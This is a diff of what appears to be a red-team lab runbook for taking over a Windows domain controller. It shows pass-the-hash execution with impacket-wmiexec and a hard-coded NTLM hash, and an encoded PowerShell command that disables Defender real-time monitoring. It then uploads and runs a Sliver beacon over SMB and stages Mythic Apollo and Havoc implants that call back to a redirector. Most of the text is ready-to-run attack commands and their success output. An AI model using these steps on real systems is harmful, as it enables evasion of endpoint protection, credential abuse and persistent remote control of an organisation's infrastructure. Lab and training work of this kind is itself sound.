@@ -104,10 +104,39 @@ scp admin@sliver:/tmp/sysProxy.exe .
 impacket-wmiexec -hashes :4366ec0f86e29be2a4a5e87a1ba922ec -nooutput shadow.gate/Administrator@<ShadowGate IP> 'powershell -enc UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgADEA'
 ```
 
-3. Upload the beacon with smbmap (nxc times out on the 35 MB binary):
+Success: Defender is disabled so now we can smuggle in our implant. 
+
+```bash
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[abstract]
+class __PARAMETERS 
+{
+        [Out(True)]
+        [MappingStrings(['Win32API|Process and Thread Functions|CreateProcess|lpProcessInformation|dwProcessId'])]
+        [ID(3)]
+        uint32 ProcessId = 2508
+
+        [out(True)]
+        uint32 ReturnValue = 0
+
+
+}
+```
+
+3. Upload the beacon with smbmap (nxc can time out on the 35 MB binary):
 
 ```bash
 smbmap -H <ShadowGate IP> -d shadow.gate -u Administrator -p 'aad3b435b51404eeaad3b435b51404ee:4366ec0f86e29be2a4a5e87a1ba922ec' --upload ./sysProxy.exe 'C$/Windows/Temp/sysProxy.exe'
+```
+
+Success:
+```bash
+[*] Detected 1 hosts serving SMB                                              
+[*] Established 1 SMB connections(s) and 1 authenticated session(s)     
+[+] Starting upload: ./sysProxy.exe (37335552 bytes)
+[+] Upload complete..
+[*] Closed 1 connections   
 ```
 
 4. Execute it:
@@ -116,12 +145,31 @@ smbmap -H <ShadowGate IP> -d shadow.gate -u Administrator -p 'aad3b435b51404eeaa
 impacket-wmiexec -hashes :4366ec0f86e29be2a4a5e87a1ba922ec -nooutput shadow.gate/Administrator@<ShadowGate IP> 'C:\Windows\Temp\sysProxy.exe'
 ```
 
+Success: Implant has been executed on the host
+
+```bash
+[abstract]
+class __PARAMETERS 
+{
+        [Out(True)]
+        [MappingStrings(['Win32API|Process and Thread Functions|CreateProcess|lpProcessInformation|dwProcessId'])]
+        [ID(3)]
+        uint32 ProcessId = 624
+
+        [out(True)]
+        uint32 ReturnValue = 0
+
+
+}
+```
+
 Confirm the session in Sliver:
 
 ```text
 sessions
 use [SESSION_ID]
 whoami
+ps
 ```
 
 Success: a new session from `<ShadowGate IP>` registers and `whoami` returns `SHADOW\Administrator`. This is the beacon, separate from the Windows heartbeat.
@@ -136,7 +184,7 @@ With a foothold on the DC, stage the other two C2s through it instead of going b
 
 The Apollo and Havoc implants are the CONFIG builds (Phase B and C), pointed at the redirector public EIP on 443, so their callbacks work on the DC unchanged. Push them from the Windows operator (where CONFIG left them) to the Sliver host. Windows Server 2022 ships the OpenSSH client:
 
-These are the CONFIG builds (`msDiag.exe` from Phase B, `hlpUpdate.exe` from Phase C). Push each one at a time:
+These are the CONFIG builds (`msDiag.exe` from Phase B, `hlpUpdate.exe` from Phase C). Use MobaXTerm to upload them to the Slivers /tmp directory or SCP each one at a time:
 
 ```powershell
 scp C:\Users\Administrator\Desktop\msDiag.exe admin@sliver:/tmp/
@@ -146,26 +194,26 @@ scp C:\Users\Administrator\Desktop\msDiag.exe admin@sliver:/tmp/
 scp C:\Users\Administrator\Desktop\hlpUpdate.exe admin@sliver:/tmp/
 ```
 
-Adjust the paths to wherever your CONFIG builds landed. In sliver-client, select the Administrator session, then upload both to the DC and execute. Run these one at a time, not as a block: Sliver errors on pasted multi-command input. Use forward slashes on the upload target, and no `-o` on execute (with `-o` it blocks on a beacon that never returns):
+In sliver-client, select the Administrator session, then upload both to the DC and execute. Run these one at a time, not as a block: Sliver errors on pasted multi-command input. Use forward slashes on the upload target, and no `-o` on execute (with `-o` it blocks on a beacon that never returns):
 
 ```text
-use [ADMIN_SESSION_ID]
+use [SHADOWGATE_SESSION_ID]
 ```
 
 ```text
-upload /tmp/msDiag.exe C:/Windows/Temp/my.exe
+upload /tmp/msDiag.exe C:/Windows/Temp/msDiag.exe
 ```
 
 ```text
-upload /tmp/hlpUpdate.exe C:/Windows/Temp/hv.exe
+upload /tmp/hlpUpdate.exe C:/Windows/Temp/hlpUpdate.exe
 ```
 
 ```text
-execute C:\\Windows\\Temp\\my.exe
+execute C:\\Windows\\Temp\\msDiag.exe
 ```
 
 ```text
-execute C:\\Windows\\Temp\\hv.exe
+execute C:\\Windows\\Temp\\hlpUpdate.exe
 ```
 
 Success: Apollo registers in Mythic's Active Callbacks and the demon in Havoc's Sessions tab, both as `SHADOW\Administrator`. All three C2s now hold an Administrator beacon on the DC, staged entirely through the Sliver foothold, no SMB or pass-the-hash needed after the first beacon.
